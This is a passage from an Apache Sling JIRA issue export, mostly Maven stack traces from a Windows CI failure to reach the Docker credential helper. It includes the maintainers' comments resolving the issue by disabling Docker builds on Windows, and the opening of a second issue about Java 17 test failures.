    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute (MojoExecutor.java:330)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:213)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:175)
    at org.apache.maven.lifecycle.internal.MojoExecutor.access$000 (MojoExecutor.java:76)
    at org.apache.maven.lifecycle.internal.MojoExecutor$1.run (MojoExecutor.java:163)
    at org.apache.maven.plugin.DefaultMojosExecutionStrategy.execute (DefaultMojosExecutionStrategy.java:39)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:160)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:105)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:73)
    at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:53)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:118)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:261)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:173)
    at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:101)
    at org.apache.maven.cli.MavenCli.execute (MavenCli.java:910)
    at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:283)
    at org.apache.maven.cli.MavenCli.main (MavenCli.java:206)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62)
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke (Method.java:566)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:283)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:226)
    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:407)
    at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:348)
Caused by: org.apache.maven.plugin.MojoExecutionException: Error getting the credentials for docker.io from the configured credential helper
    at io.fabric8.maven.docker.util.CredentialHelperClient.getAuthConfig (CredentialHelperClient.java:49)
    at io.fabric8.maven.docker.util.AuthConfigFactory.extractAuthConfigFromCredentialsHelper (AuthConfigFactory.java:542)
    at io.fabric8.maven.docker.util.AuthConfigFactory.getAuthConfigFromDockerConfig (AuthConfigFactory.java:514)
    at io.fabric8.maven.docker.util.AuthConfigFactory.createAuthConfig (AuthConfigFactory.java:132)
    at io.fabric8.maven.docker.service.RegistryService$RegistryConfig.createAuthConfig (RegistryService.java:210)
    at io.fabric8.maven.docker.service.RegistryService.createAuthConfig (RegistryService.java:168)
    at io.fabric8.maven.docker.service.RegistryService.pullImageWithPolicy (RegistryService.java:126)
    at io.fabric8.maven.docker.service.BuildService.autoPullBaseImage (BuildService.java:386)
    at io.fabric8.maven.docker.service.BuildService.buildImage (BuildService.java:67)
    at io.fabric8.maven.docker.BuildMojo.proceedWithDockerBuild (BuildMojo.java:107)
    at io.fabric8.maven.docker.BuildMojo.proceedWithBuildProcess (BuildMojo.java:90)
    at io.fabric8.maven.docker.BuildMojo.buildAndTag (BuildMojo.java:83)
    at io.fabric8.maven.docker.BuildMojo.processImageConfig (BuildMojo.java:175)
    at io.fabric8.maven.docker.BuildMojo.executeInternal (BuildMojo.java:72)
    at io.fabric8.maven.docker.AbstractDockerMojo.execute (AbstractDockerMojo.java:277)
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:126)
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute2 (MojoExecutor.java:342)
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute (MojoExecutor.java:330)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:213)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:175)
    at org.apache.maven.lifecycle.internal.MojoExecutor.access$000 (MojoExecutor.java:76)
    at org.apache.maven.lifecycle.internal.MojoExecutor$1.run (MojoExecutor.java:163)
    at org.apache.maven.plugin.DefaultMojosExecutionStrategy.execute (DefaultMojosExecutionStrategy.java:39)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:160)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:105)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:73)
    at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:53)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:118)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:261)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:173)
    at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:101)
    at org.apache.maven.cli.MavenCli.execute (MavenCli.java:910)
    at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:283)
    at org.apache.maven.cli.MavenCli.main (MavenCli.java:206)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62)
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke (Method.java:566)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:283)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:226)
    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:407)
    at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:348)
Caused by: java.io.IOException: Failed to start &apos;docker-credential-desktop get&apos; : Cannot run program &quot;docker-credential-desktop&quot;: CreateProcess error=2, The system cannot find the file specified
    at io.fabric8.maven.docker.access.util.ExternalCommand.startProcess (ExternalCommand.java:104)
    at io.fabric8.maven.docker.access.util.ExternalCommand.execute (ExternalCommand.java:46)
    at io.fabric8.maven.docker.util.CredentialHelperClient$GetCommand.getCredentialNode (CredentialHelperClient.java:114)
    at io.fabric8.maven.docker.util.CredentialHelperClient.getAuthConfig (CredentialHelperClient.java:43)
    at io.fabric8.maven.docker.util.AuthConfigFactory.extractAuthConfigFromCredentialsHelper (AuthConfigFactory.java:542)
    at io.fabric8.maven.docker.util.AuthConfigFactory.getAuthConfigFromDockerConfig (AuthConfigFactory.java:514)
    at io.fabric8.maven.docker.util.AuthConfigFactory.createAuthConfig (AuthConfigFactory.java:132)
    at io.fabric8.maven.docker.service.RegistryService$RegistryConfig.createAuthConfig (RegistryService.java:210)
    at io.fabric8.maven.docker.service.RegistryService.createAuthConfig (RegistryService.java:168)
    at io.fabric8.maven.docker.service.RegistryService.pullImageWithPolicy (RegistryService.java:126)
    at io.fabric8.maven.docker.service.BuildService.autoPullBaseImage (BuildService.java:386)
    at io.fabric8.maven.docker.service.BuildService.buildImage (BuildService.java:67)
    at io.fabric8.maven.docker.BuildMojo.proceedWithDockerBuild (BuildMojo.java:107)
    at io.fabric8.maven.docker.BuildMojo.proceedWithBuildProcess (BuildMojo.java:90)
    at io.fabric8.maven.docker.BuildMojo.buildAndTag (BuildMojo.java:83)
    at io.fabric8.maven.docker.BuildMojo.processImageConfig (BuildMojo.java:175)
    at io.fabric8.maven.docker.BuildMojo.executeInternal (BuildMojo.java:72)
    at io.fabric8.maven.docker.AbstractDockerMojo.execute (AbstractDockerMojo.java:277)
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:126)
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute2 (MojoExecutor.java:342)
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute (MojoExecutor.java:330)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:213)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:175)
    at org.apache.maven.lifecycle.internal.MojoExecutor.access$000 (MojoExecutor.java:76)
    at org.apache.maven.lifecycle.internal.MojoExecutor$1.run (MojoExecutor.java:163)
    at org.apache.maven.plugin.DefaultMojosExecutionStrategy.execute (DefaultMojosExecutionStrategy.java:39)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:160)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:105)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:73)
    at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:53)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:118)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:261)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:173)
    at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:101)
    at org.apache.maven.cli.MavenCli.execute (MavenCli.java:910)
    at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:283)
    at org.apache.maven.cli.MavenCli.main (MavenCli.java:206)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62)
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke (Method.java:566)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:283)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:226)
    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:407)
    at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:348)
Caused by: java.io.IOException: Cannot run program &quot;docker-credential-desktop&quot;: CreateProcess error=2, The system cannot find the file specified
    at java.lang.ProcessBuilder.start (ProcessBuilder.java:1128)
    at java.lang.ProcessBuilder.start (ProcessBuilder.java:1071)
    at io.fabric8.maven.docker.access.util.ExternalCommand.startCommand (ExternalCommand.java:112)
    at io.fabric8.maven.docker.access.util.ExternalCommand.startProcess (ExternalCommand.java:102)
    at io.fabric8.maven.docker.access.util.ExternalCommand.execute (ExternalCommand.java:46)
    at io.fabric8.maven.docker.util.CredentialHelperClient$GetCommand.getCredentialNode (CredentialHelperClient.java:114)
    at io.fabric8.maven.docker.util.CredentialHelperClient.getAuthConfig (CredentialHelperClient.java:43)
    at io.fabric8.maven.docker.util.AuthConfigFactory.extractAuthConfigFromCredentialsHelper (AuthConfigFactory.java:542)
    at io.fabric8.maven.docker.util.AuthConfigFactory.getAuthConfigFromDockerConfig (AuthConfigFactory.java:514)
    at io.fabric8.maven.docker.util.AuthConfigFactory.createAuthConfig (AuthConfigFactory.java:132)
    at io.fabric8.maven.docker.service.RegistryService$RegistryConfig.createAuthConfig (RegistryService.java:210)
    at io.fabric8.maven.docker.service.RegistryService.createAuthConfig (RegistryService.java:168)
    at io.fabric8.maven.docker.service.RegistryService.pullImageWithPolicy (RegistryService.java:126)
    at io.fabric8.maven.docker.service.BuildService.autoPullBaseImage (BuildService.java:386)
    at io.fabric8.maven.docker.service.BuildService.buildImage (BuildService.java:67)
    at io.fabric8.maven.docker.BuildMojo.proceedWithDockerBuild (BuildMojo.java:107)
    at io.fabric8.maven.docker.BuildMojo.proceedWithBuildProcess (BuildMojo.java:90)
    at io.fabric8.maven.docker.BuildMojo.buildAndTag (BuildMojo.java:83)
    at io.fabric8.maven.docker.BuildMojo.processImageConfig (BuildMojo.java:175)
    at io.fabric8.maven.docker.BuildMojo.executeInternal (BuildMojo.java:72)
    at io.fabric8.maven.docker.AbstractDockerMojo.execute (AbstractDockerMojo.java:277)
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:126)
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute2 (MojoExecutor.java:342)
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute (MojoExecutor.java:330)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:213)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:175)
    at org.apache.maven.lifecycle.internal.MojoExecutor.access$000 (MojoExecutor.java:76)
    at org.apache.maven.lifecycle.internal.MojoExecutor$1.run (MojoExecutor.java:163)
    at org.apache.maven.plugin.DefaultMojosExecutionStrategy.execute (DefaultMojosExecutionStrategy.java:39)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:160)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:105)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:73)
    at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:53)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:118)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:261)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:173)
    at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:101)
    at org.apache.maven.cli.MavenCli.execute (MavenCli.java:910)
    at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:283)
    at org.apache.maven.cli.MavenCli.main (MavenCli.java:206)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62)
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke (Method.java:566)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:283)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:226)
    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:407)
    at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:348)
Caused by: java.io.IOException: CreateProcess error=2, The system cannot find the file specified
    at java.lang.ProcessImpl.create (Native Method)
    at java.lang.ProcessImpl.&amp;lt;init&amp;gt; (ProcessImpl.java:492)
    at java.lang.ProcessImpl.start (ProcessImpl.java:153)
    at java.lang.ProcessBuilder.start (ProcessBuilder.java:1107)
    at java.lang.ProcessBuilder.start (ProcessBuilder.java:1071)
    at io.fabric8.maven.docker.access.util.ExternalCommand.startCommand (ExternalCommand.java:112)
    at io.fabric8.maven.docker.access.util.ExternalCommand.startProcess (ExternalCommand.java:102)
    at io.fabric8.maven.docker.access.util.ExternalCommand.execute (ExternalCommand.java:46)
    at io.fabric8.maven.docker.util.CredentialHelperClient$GetCommand.getCredentialNode (CredentialHelperClient.java:114)
    at io.fabric8.maven.docker.util.CredentialHelperClient.getAuthConfig (CredentialHelperClient.java:43)
    at io.fabric8.maven.docker.util.AuthConfigFactory.extractAuthConfigFromCredentialsHelper (AuthConfigFactory.java:542)
    at io.fabric8.maven.docker.util.AuthConfigFactory.getAuthConfigFromDockerConfig (AuthConfigFactory.java:514)
    at io.fabric8.maven.docker.util.AuthConfigFactory.createAuthConfig (AuthConfigFactory.java:132)
    at io.fabric8.maven.docker.service.RegistryService$RegistryConfig.createAuthConfig (RegistryService.java:210)
    at io.fabric8.maven.docker.service.RegistryService.createAuthConfig (RegistryService.java:168)
    at io.fabric8.maven.docker.service.RegistryService.pullImageWithPolicy (RegistryService.java:126)
    at io.fabric8.maven.docker.service.BuildService.autoPullBaseImage (BuildService.java:386)
    at io.fabric8.maven.docker.service.BuildService.buildImage (BuildService.java:67)
    at io.fabric8.maven.docker.BuildMojo.proceedWithDockerBuild (BuildMojo.java:107)
    at io.fabric8.maven.docker.BuildMojo.proceedWithBuildProcess (BuildMojo.java:90)
    at io.fabric8.maven.docker.BuildMojo.buildAndTag (BuildMojo.java:83)
    at io.fabric8.maven.docker.BuildMojo.processImageConfig (BuildMojo.java:175)
    at io.fabric8.maven.docker.BuildMojo.executeInternal (BuildMojo.java:72)
    at io.fabric8.maven.docker.AbstractDockerMojo.execute (AbstractDockerMojo.java:277)
    at org.apache.maven.plugin.DefaultBuildPluginManager.executeMojo (DefaultBuildPluginManager.java:126)
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute2 (MojoExecutor.java:342)
    at org.apache.maven.lifecycle.internal.MojoExecutor.doExecute (MojoExecutor.java:330)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:213)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:175)
    at org.apache.maven.lifecycle.internal.MojoExecutor.access$000 (MojoExecutor.java:76)
    at org.apache.maven.lifecycle.internal.MojoExecutor$1.run (MojoExecutor.java:163)
    at org.apache.maven.plugin.DefaultMojosExecutionStrategy.execute (DefaultMojosExecutionStrategy.java:39)
    at org.apache.maven.lifecycle.internal.MojoExecutor.execute (MojoExecutor.java:160)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:105)
    at org.apache.maven.lifecycle.internal.LifecycleModuleBuilder.buildProject (LifecycleModuleBuilder.java:73)
    at org.apache.maven.lifecycle.internal.builder.singlethreaded.SingleThreadedBuilder.build (SingleThreadedBuilder.java:53)
    at org.apache.maven.lifecycle.internal.LifecycleStarter.execute (LifecycleStarter.java:118)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:261)
    at org.apache.maven.DefaultMaven.doExecute (DefaultMaven.java:173)
    at org.apache.maven.DefaultMaven.execute (DefaultMaven.java:101)
    at org.apache.maven.cli.MavenCli.execute (MavenCli.java:910)
    at org.apache.maven.cli.MavenCli.doMain (MavenCli.java:283)
    at org.apache.maven.cli.MavenCli.main (MavenCli.java:206)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0 (Native Method)
    at jdk.internal.reflect.NativeMethodAccessorImpl.invoke (NativeMethodAccessorImpl.java:62)
    at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke (DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke (Method.java:566)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launchEnhanced (Launcher.java:283)
    at org.codehaus.plexus.classworlds.launcher.Launcher.launch (Launcher.java:226)
    at org.codehaus.plexus.classworlds.launcher.Launcher.mainWithExitCode (Launcher.java:407)
    at org.codehaus.plexus.classworlds.launcher.Launcher.main (Launcher.java:348)
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</description>
                <environment></environment>
        <key id="13539408">SLING-11905</key>
            <summary>Starter builds fail on Windows nodes:  Error getting the credentials for docker.io from the configured credential helper</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="rombert">Robert Munteanu</assignee>
                                    <reporter username="rombert">Robert Munteanu</reporter>
                        <labels>
                    </labels>
                <created>Fri, 9 Jun 2023 10:17:56 +0000</created>
                <updated>Fri, 17 Jan 2025 09:58:35 +0000</updated>
                            <resolved>Thu, 19 Dec 2024 08:28:34 +0000</resolved>
                                                    <fixVersion>Starter 13</fixVersion>
                                    <component>Starter</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17735830" author="rombert" created="Wed, 21 Jun 2023 17:26:12 +0000"  >&lt;p&gt;After help from the ASF infra team we got to another error&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] Failed to execute goal io.fabric8:docker-maven-plugin:0.43.0:build (build-docker-image) on project org.apache.sling.starter: Unable to pull &apos;docker.io/openjdk:17-slim&apos; from registry &apos;docker.io&apos; : no matching manifest for windows/amd64 10.0.17763 in the manifest list entries -&amp;gt; [Help 1]
org.apache.maven.lifecycle.LifecycleExecutionException: Failed to execute goal io.fabric8:docker-maven-plugin:0.43.0:build (build-docker-image) on project org.apache.sling.starter: Unable to pull &apos;docker.io/openjdk:17-slim&apos; from registry &apos;docker.io&apos; : no matching manifest for windows/amd64 10.0.17763 in the manifest list entries 
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Looks like we need to find a multi-arch JDK image.&lt;/p&gt;</comment>
                            <comment id="17770085" author="rombert" created="Thu, 28 Sep 2023 14:31:16 +0000"  >&lt;p&gt;Discussing with &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=cziegeler&quot; class=&quot;user-hover&quot; rel=&quot;cziegeler&quot;&gt;cziegeler&lt;/a&gt; and &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt; I realised that we probably don&apos;t want/need to build containers on Windows, so we should exclude the docker configuration.&lt;/p&gt;</comment>
                            <comment id="17906964" author="sseifert@pro-vision.de" created="Thu, 19 Dec 2024 08:28:34 +0000"  >&lt;p&gt;yes, i would not invest more time in getting this to run on windows. it should work with WSL2 on windows, this is in my experience the better alternative if something does not work OOTB together with docker on windows.&lt;/p&gt;</comment>
                            <comment id="17907062" author="rombert" created="Thu, 19 Dec 2024 14:45:10 +0000"  >&lt;p&gt;I updated &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-starter/pull/171&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-starter/pull/171&lt;/a&gt; to enable CI builds on Windows but with Docker disabled. Builds are now green. &lt;/p&gt;</comment>
                            <comment id="17907067" author="sseifert@pro-vision.de" created="Thu, 19 Dec 2024 14:53:47 +0000"  >&lt;p&gt;thanks, great!&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="10032">
                    <name>Blocker</name>
                                                                <inwardlinks description="is blocked by">
                                                        </inwardlinks>
                                    </issuelinktype>
                            <issuelinktype id="10030">
                    <name>Reference</name>
                                                                <inwardlinks description="is related to">
                                        <issuelink>
            <issuekey id="13603935">SLING-12600</issuekey>
        </issuelink>
                            </inwardlinks>
                                    </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            43 weeks, 6 days ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1ifw8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11897] Default Get Servlet tests fail on Java 17</title>
                <link>https://issues.apache.org/jira/browse/SLING-11897</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;[ERROR] org.apache.sling.servlets.get.impl.helpers.JsonRendererBinaryDataTest.testExportBinaryDataDisabled  Time elapsed: 0.088 s  &amp;lt;&amp;lt;&amp;lt; ERROR!
java.lang.RuntimeException: Unable to initialize JCR_OAK resource resolver factory: java/security/acl/Group
	at org.apache.sling.testing.mock.sling.context.ContextResourceResolverFactory.get(ContextResourceResolverFactory.java:68)
	at org.apache.sling.testing.mock.sling.context.SlingContextImpl.newResourceResolverFactory(SlingContextImpl.java:145)
	at org.apache.sling.testing.mock.sling.context.SlingContextImpl.resourceResolverFactory(SlingContextImpl.java:150)
	at org.apache.sling.testing.mock.sling.context.SlingContextImpl.setUp(SlingContextImpl.java:134)
	at org.apache.sling.testing.mock.sling.junit.SlingContext.access$100(SlingContext.java:42)
	at org.apache.sling.testing.mock.sling.junit.SlingContext$1.before(SlingContext.java:146)
	at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:50)
	at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306)
	at org.junit.runners.BlockJUnit4ClassRunner$1.evaluate(BlockJUnit4ClassRunner.java:100)
	at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:366)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:103)
	at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:63)
	at org.junit.runners.ParentRunner$4.run(ParentRunner.java:331)
	at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:79)
	at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:329)
	at org.junit.runners.ParentRunner.access$100(ParentRunner.java:66)
	at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:293)
	at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306)
	at org.junit.runners.ParentRunner.run(ParentRunner.java:413)
	at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:365)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeWithRerun(JUnit4Provider.java:273)
	at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:238)
	at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:159)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:377)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:138)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:465)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:451)
Caused by: java.lang.NoClassDefFoundError: java/security/acl/Group
	at org.apache.jackrabbit.oak.security.user.UserConfigurationImpl.getUserPrincipalProvider(UserConfigurationImpl.java:245)
	at org.apache.jackrabbit.oak.security.principal.PrincipalConfigurationImpl.getPrincipalProvider(PrincipalConfigurationImpl.java:75)
	at org.apache.jackrabbit.oak.spi.security.principal.CompositePrincipalConfiguration.getPrincipalProvider(CompositePrincipalConfiguration.java:55)
	at org.apache.jackrabbit.oak.spi.security.authentication.AbstractLoginModule.getPrincipalProvider(AbstractLoginModule.java:454)
	at org.apache.jackrabbit.oak.spi.security.authentication.AbstractLoginModule.getPrincipals(AbstractLoginModule.java:490)
	at org.apache.jackrabbit.oak.security.authentication.user.LoginModuleImpl.commit(LoginModuleImpl.java:167)
	at java.base/javax.security.auth.login.LoginContext.invoke(LoginContext.java:758)
	at java.base/javax.security.auth.login.LoginContext$4.run(LoginContext.java:679)
	at java.base/javax.security.auth.login.LoginContext$4.run(LoginContext.java:677)
	at java.base/java.security.AccessController.doPrivileged(AccessController.java:712)
	at java.base/javax.security.auth.login.LoginContext.invokePriv(LoginContext.java:677)
	at java.base/javax.security.auth.login.LoginContext.login(LoginContext.java:588)
	at org.apache.jackrabbit.oak.core.ContentRepositoryImpl.login(ContentRepositoryImpl.java:163)
	at org.apache.jackrabbit.oak.jcr.repository.RepositoryImpl.login(RepositoryImpl.java:288)
	at org.apache.jackrabbit.oak.jcr.repository.RepositoryImpl.login(RepositoryImpl.java:226)
	at org.apache.sling.testing.mock.sling.oak.OakMockSlingRepository.login(OakMockSlingRepository.java:123)
